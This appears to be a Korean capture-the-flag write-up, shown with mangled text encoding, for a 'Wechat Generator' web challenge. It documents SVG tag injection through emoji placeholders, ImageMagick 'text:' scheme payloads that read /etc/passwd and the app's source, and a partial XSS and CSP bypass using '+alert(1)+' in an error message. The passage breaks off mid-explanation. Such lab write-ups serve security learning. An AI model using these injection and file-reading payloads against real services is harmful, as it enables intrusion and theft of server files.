&lt;p&gt;ë©”ì¸ í˜ì´ì§€ì—ì„œëŠ” í¬ê²Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;Preview&lt;/code&gt;ì™€ &lt;code class=&quot;highlighter-rouge&quot;&gt;Share&lt;/code&gt; ê¸°ëŠ¥ì´ ì¡´ì¬í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Preview&lt;/code&gt; ê¸°ëŠ¥ì˜ ê²½ìš° ì„œë²„ë¡œ ìš”ì²­ê³¼ ì‘ë‹µ íŒ¨í‚·ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST http://pwnable.org:5000/preview HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Content-Length: 122
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://pwnable.org:5000
Referer: http://pwnable.org:5000/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

data=[{&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;},{&quot;type&quot;:1,&quot;message&quot;:&quot;Me too!!!&quot;}]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 06:38:45 GMT
Connection: close
Content-Type: application/json
Content-Length: 95404

{&quot;previewid&quot;:&quot;94e38e87-3554-4c0a-91c4-e31febc9c344&quot;,&quot;data&quot;:&quot;data:image/svg+xml;base64,(Base64 Encoded SVG data)&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ëŒ€í™” ë‚´ìš©(data)ì„ ë„£ê³  ìš”ì²­í•˜ë©´ ì‘ë‹µìœ¼ë¡œ &lt;code class=&quot;highlighter-rouge&quot;&gt;previewid&lt;/code&gt;ì™€ &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt;ë¥¼ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt;ëŠ” Base64ë¡œ ì¸ì½”ë”©ëœ ì´ë¯¸ì§€ì´ë©° ìƒˆë¡œìš´ ëŒ€í™” ë‚´ìš©ì„ í™”ë©´ì— ì¶œë ¥ì‹œì¼œì¤ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/jeong62.png&quot; alt=&quot;/assets/jeong62.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt;ì˜ ë‚´ìš©ì„ ë³´ë©´ &lt;code class=&quot;highlighter-rouge&quot;&gt;image/svg+xml&lt;/code&gt;ì„ í™•ì¸ í•  ìˆ˜ ìˆê³  Base64ë¡œ ì¸ì½”ë”©ëœ ì´ë¯¸ì§€ íŒŒì¼ì„ ë””ì½”ë”©ì„ í•˜ë©´  ìœ„ì™€ ê°™ì´ svgë¡œ ìƒì„±ëœ ì´ë¯¸ì§€ì¸ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;Wechat GeneratorëŠ” ì´ëª¨í‹°ì½˜(ì´ëª¨ì§€)ë„ ì§€ì›ì„ í•©ë‹ˆë‹¤. ì´ëª¨í‹°ì½˜ì„ ì‚¬ìš©í–ˆì„ë•Œ íŒ¨í‚·ì„ ë³´ë©´ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST http://pwnable.org:5000/preview HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Content-Length: 133
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://pwnable.org:5000
Referer: http://pwnable.org:5000/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

data=[{&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;},{&quot;type&quot;:1,&quot;message&quot;:&quot;Me too!!![smile]!!!&quot;}]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 06:59:56 GMT
Connection: close
Content-Type: application/json
Content-Length: 95676

{&quot;previewid&quot;:&quot;412cf8f6-e141-41e9-bc95-dec8a01bc55d&quot;,&quot;data&quot;:&quot;data:image/svg+xml;base64,(Base64 Encoded SVG data)&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Requestsì˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt;ì˜ ì´ëª¨ì§€ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;[smile]&lt;/code&gt; text ë“¤ì–´ê°€ë©° Responseì˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt;ë¥¼ ë””ì½”ë”© í•˜ì—¬ ì‚´í´ë³´ë©´ &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;image&amp;gt;&lt;/code&gt;ë¡œ ì¹˜í™˜ë˜ì–´ ë“¤ì–´ê°€ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;g&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;transform=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;translate(273 572)&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;text&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;font-family=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SimHei,SimHei&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;font-size=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;72&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Me too!!!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/text&amp;gt;&amp;lt;image&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;x=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;360&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;y=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-60&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;100&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:xlink=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/1999/xlink&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xlink:href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://pwnable.org:5000/static/emoji/smile.png&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;text&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;x=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;460&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;font-family=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SimHei,SimHei&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;font-size=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;72&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;!!!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/text&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/g&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[smile] -&amp;gt; &amp;lt;/text&amp;gt;&amp;lt;image x=&quot;360&quot; y=&quot;-60&quot; height=&quot;100&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;http://pwnable.org:5000/static/emoji/smile.png&quot; /&amp;gt;&amp;lt;text x=&quot;460&quot; font-family=&quot;SimHei,SimHei&quot; font-size=&quot;72&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë”°ë¼ì„œ ì•„ë˜ì™€ ê°™ì€ ìš”ì²­ìœ¼ë¡œ ì´ë¯¸ì§€ë¥¼ ì„ì˜ë¡œ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[{&quot;type&quot;:0,&quot;message&quot;:&quot;[smile.png\&quot;/&amp;gt;&amp;lt;image xmlns:xlink=\&quot;http://www.w3.org/1999/xlink\&quot; xlink:href=\&quot;http://u1804.jeong.su:8888/\&quot;/&amp;gt;&amp;lt;test x=\&quot;]&quot;}]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë‹¨, ìš”ì²­ì€ &lt;code class=&quot;highlighter-rouge&quot;&gt;preview&lt;/code&gt; ê¸°ëŠ¥ì´ ì•„ë‹Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;Share&lt;/code&gt; ê¸°ëŠ¥ì„ ì‚¬ìš©í• ë•Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;ImageMagick&lt;/code&gt;ì— ì˜í•´ ëœë”ë§ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Share&lt;/code&gt; ê¸°ëŠ¥ì€ &lt;code class=&quot;highlighter-rouge&quot;&gt;previewid&lt;/code&gt;ë¥¼ ê³µìœ  URLë¡œ ë§Œë“¤ì–´ì£¼ëŠ” ê¸°ëŠ¥ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST http://pwnable.org:5000/share HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Content-Length: 46
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://pwnable.org:5000
Referer: http://pwnable.org:5000/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

previewid=f2bc983f-4ef5-4ade-89da-7e3ad321d626
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 07:47:27 GMT
Connection: close
Content-Type: application/json
Content-Length: 47

{&quot;url&quot;: &quot;http://pwnable.org:5000/share/tTVFUw&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê³µìœ  URLì„ ì ‘ì†í•˜ê²Œ ë˜ë©´ &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img class=&quot;shareimg&quot; src=&quot;/image/tTVFUw/png&quot; id=&quot;preview&quot;/&amp;gt;&lt;/code&gt; ì™€ ê°™ì´ ì´ë¯¸ì§€ë¥¼ ê°€ì ¸ì˜¤ë©°  &lt;code class=&quot;highlighter-rouge&quot;&gt;ImageMagick&lt;/code&gt;ì— ì˜í•´ ëœë”ë§ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ìš°ë¦¬ëŠ” FLAGë¥¼ ì–»ê¸° ìœ„í•´ì„œ ì„œë²„ì˜ ì‰˜ì„ íšë“í•˜ê±°ë‚˜ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆì–´ì•¼í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ë•Œ ìœ„ì—ì„œ ì–¸ê¸‰í–ˆë˜ ì´ë¯¸ì§€ë¥¼ ì„ì˜ë¡œ ì‚½ì… í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[{&quot;type&quot;:0,&quot;message&quot;:&quot;[smile.png\&quot;/&amp;gt;&amp;lt;image xmlns:xlink=\&quot;http://www.w3.org/1999/xlink\&quot; xlink:href=\&quot;http://u1804.jeong.su:8888/\&quot;/&amp;gt;&amp;lt;test x=\&quot;]&quot;}]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì—¬ëŸ¬ê°€ì§€ Schemeì„ ì‚¬ìš©í•˜ì—¬ LFIë¥¼ ì‹œë„í•œ ê²°ê³¼, ì•„ë˜ì™€ ê°™ì€ ì…ë ¥ ê°’ì„ ì‚¬ìš©í•˜ì—¬ ë¡œì»¬ íŒŒì¼ì„ ì½ì–´ ì˜¬ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xlink:href=&quot;text:/etc/passwd&quot;

[{&quot;type&quot;:0,&quot;message&quot;:&quot;[smile.png\&quot;/&amp;gt;&amp;lt;image xmlns:xlink=\&quot;http://www.w3.org/1999/xlink\&quot; xlink:href=\&quot;text:/etc/passwd\&quot;/&amp;gt;&amp;lt;test x=\&quot;]&quot;}]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì†ŒìŠ¤ì½”ë“œëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;/app/app.py&lt;/code&gt; ê²½ë¡œì—ì„œ íšë“í•  ìˆ˜ ìˆì—ˆê³  ì•„ë˜ì™€ ê°™ì´ ì´ë¯¸ì§€ë¡œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xlink:href=&quot;text:/app/app.py&quot;

[{&quot;type&quot;:0,&quot;message&quot;:&quot;[smile.png\&quot;/&amp;gt;&amp;lt;image xmlns:xlink=\&quot;http://www.w3.org/1999/xlink\&quot; xlink:href=\&quot;text:/app/app.py\&quot;/&amp;gt;&amp;lt;test x=\&quot;]&quot;}]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/jeong63.png&quot; alt=&quot;/assets/jeong63.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws&quot;&gt;http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ì†ŒìŠ¤ì½”ë“œë¥¼ í†µí•´ Admin ê¸°ëŠ¥ì˜ URLì„ ë°œê²¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì ‘ì†ì„ í•˜ë©´ ì•„ë˜ì™€ ê°™ì€ ë©”ì„¸ì§€ì™€ URLì„ ì…ë ¥í•  ìˆ˜ ìˆëŠ” Input Boxê°€ ë‚˜ì˜¤ê²Œë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Submit URL that can alert(1) to admin.
He will give you whatever you want for reward :)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´ì œ ë¬¸ì œê°€ XSS Challege, CSP Bypass Challegeë¡œ ë°”ë€ŒëŠ” ìˆœê°„ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì‚¬ì§„ì„ ë³´ì—¬ì£¼ëŠ” Share ê¸°ëŠ¥ì„ ì‚´í´ë³´ë©´ ë’¤ì— í™•ì¥ìê°€ ì¡´ì¬í•˜ëŠ” ê²ƒì„ í™•ì¸ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://pwnable.org:5000/image/RjtlqV/png&quot;&gt;http://pwnable.org:5000/image/RjtlqV/png&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;pngì˜ ê°’ì„ ì„ì˜ë¡œ ë³€ê²½í–ˆì„ë•Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;error&quot;: &quot;Wrong extension&quot;}&lt;/code&gt; ë¼ëŠ” ë¦¬í„´ì´ ì¶œë ¥ë˜ëŠ” ê²ƒì„ í™•ì¸ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í™•ì¥ìê°€ í‹€ë ¸ë‹¤ëŠ” ë©”ì„¸ì§€ê°€ ë°œìƒí•˜ë¯€ë¡œ ì—¬ëŸ¬ê°€ì§€ í™•ì¥ìë¥¼ ì‹œë„í•´ë´…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì—¬ëŸ¬ê°€ì§€ ì´ë¯¸ì§€ í¬ë§·ì˜ í™•ì¥ìëŠ” ë¬¼ë¡ , &lt;code class=&quot;highlighter-rouge&quot;&gt;abc&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;txt&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;pdf&lt;/code&gt;ë“±ì˜ í™•ì¥ìë¡œ &lt;code class=&quot;highlighter-rouge&quot;&gt;ImageMagick&lt;/code&gt;ì´ ë³€í™˜ì‹œì¼œì¤ë‹ˆë‹¤. &lt;code class=&quot;highlighter-rouge&quot;&gt;exe&lt;/code&gt; í™•ì¥ìì˜ ê²½ìš°ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;error&quot;: &quot;Convert exception: u'exe' is unsupported format&quot;}&lt;/code&gt;ì™€ ê°™ì€ ì—ëŸ¬ê°€ ë°œìƒí–ˆìŠµë‹ˆë‹¤. (ìœ ì €ì˜ ì¸í’‹ì´ ê·¸ëŒ€ë¡œ ì¶œë ¥ë˜ëŠ” ìƒí™©ì…ë‹ˆë‹¤.)&lt;/p&gt;

&lt;p&gt;XSSë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ”ê²Œ ëª©ì ì´ê¸° ë•Œë¬¸ì— ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰ í•  ìˆ˜ ìˆëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;html&lt;/code&gt; í™•ì¥ìë„ ì‹œë„í•´ë´¤ì§€ë§Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;error&quot;: &quot;Wrong extension&quot;}&lt;/code&gt; ë©”ì„¸ì§€ê°€ ë°œìƒí–ˆê³  ê²°êµ­ &lt;code class=&quot;highlighter-rouge&quot;&gt;htm&lt;/code&gt; í™•ì¥ìë¥¼ í†µí•´ ì‚¬ìš©ìê°€ ì…ë ¥í•œ ê°’ì„ ê·¸ëŒ€ë¡œ ì¶œë ¥í•´ì¤ë‹ˆë‹¤. Wechat ì´ë¯¸ì§€ë¥¼ ìƒì„±í•  ë•Œ ìƒê°í•´ë³´ë©´ &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;image&amp;gt;&lt;/code&gt; íƒœê·¸ë¥¼ ë„£ì—ˆë˜ ê²ƒì²˜ëŸ¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; íƒœê·¸ë¥¼ ì‚½ì…í•´ì£¼ëŠ” ë°©ë²•ìœ¼ë¡œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì—¬ëŸ¬ ê¸°ëŠ¥ì„ ì‚´í´ë³´ë©´ì„œ CSPê°€ ì•„ë˜ì™€ ê°™ì´ íŠ¹ì • ê¸°ëŠ¥(ì„œë¹„ìŠ¤)ì—ë§Œ ê±¸ë ¤ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pwnable.org:5000/
http://pwnable.org:5000/share/tTVFUw
http://pwnable.org:5000/image/tTVFUw/png

Content-Security-Policy: img-src * data:; default-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; object-src 'none'; base-uri 'self'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;default-src 'self'&lt;/code&gt; ë•Œë¬¸ì— ê°™ì€ ë„ë©”ì¸ì— js íŒŒì¼ì„ ì—…ë¡œë“œí•˜ëŠ” ë°©ë²•ìœ¼ë¡œ CSPë¥¼ ìš°íšŒ í•  ìˆ˜ ìˆê² ë‹¤ë¼ëŠ” ìƒê°ì´ ë“¤ì—ˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì£¼ì–´ì§„ ì›¹ ì„œë¹„ìŠ¤ëŠ” íŒŒì¼ì„ ì—…ë¡œë“œí•˜ëŠ” ê¸°ëŠ¥ì´ ì—†ìŠµë‹ˆë‹¤. ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ë©´ì„œ ì•„ë˜ì™€ ê°™ì€ ì‚¬ì‹¤ì„ ì•Œê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Share&lt;/code&gt; ê¸°ëŠ¥ì„ ì‚¬ìš©í•  ë•Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;previewid&lt;/code&gt;ë¡œ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê°’ì„ ì£¼ê²Œ ë˜ë©´ ì—ëŸ¬ê°€ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST http://pwnable.org:5000/share HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Content-Length: 14
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://pwnable.org:5000
Referer: http://pwnable.org:5000/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

previewid=abcd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 08:28:06 GMT
Connection: close
Content-Type: application/json
Content-Length: 47

{&quot;url&quot;: &quot;http://pwnable.org:5000/share/PfLqNp&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET http://pwnable.org:5000/image/PfLqNp/png HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 08:29:19 GMT
Connection: close
Content-Type: application/json
Content-Length: 124
Content-Security-Policy: img-src * data:; default-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; object-src 'none'; base-uri 'self'

{&quot;error&quot;: &quot;Convert exception: unable to open image `previews/abcd': No such file or directory @ error/blob.c/OpenBlob/2874&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë”°ë¼ì„œ &lt;code class=&quot;highlighter-rouge&quot;&gt;previewid&lt;/code&gt;ë¥¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;+alert(1)+&quot;&lt;/code&gt;ë¡œ í•˜ê³  ê³µìœ  ê¸°ëŠ¥ì„ ì‚¬ìš©í•¨ìœ¼ë¡œì¨ ìš°ë¦¬ëŠ” ì•„ë˜ì™€ ê°™ì€ JSONì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{&quot;error&quot;: &quot;Convert exception: unable to open image `previews/&quot;+alert(1)+&quot;': No such file or directory @ error/blob.c/OpenBlob/2874&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ JSONì„ Javascript Consoleì—ì„œ ì‚¬ìš©í•˜ë©´ ë‹¹ì—°íˆ alert ë©”ì„¸ì§€ê°€ ì˜ëœ¹ë‹ˆë‹¤. í•˜ì§€ë§Œ scriptì˜ js íŒŒì¼ì²˜ëŸ¼ ë¶ˆëŸ¬ì˜¤ê²Œ ë˜ë©´ ì•„ë˜ì™€ ê°™ì€ ì—ëŸ¬ê°€ ë°œìƒí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/jeong64.png&quot; alt=&quot;/assets/jeong64.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ JSON íŒŒì¼ì„ &lt;script&gt; íƒœê·¸ì˜ srcë¡œ ë°”ë¡œ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ê²€ìƒ‰í•˜ë‹¤ë³´ë‹ˆ ë³´í†µì€ Callback Functionì„ í†µí•´ ì‚¬ìš©í•œë‹¤ê³  ë˜ì–´ìˆìŠµë‹ˆë‹¤.&lt;/script&gt;&lt;/p&gt;

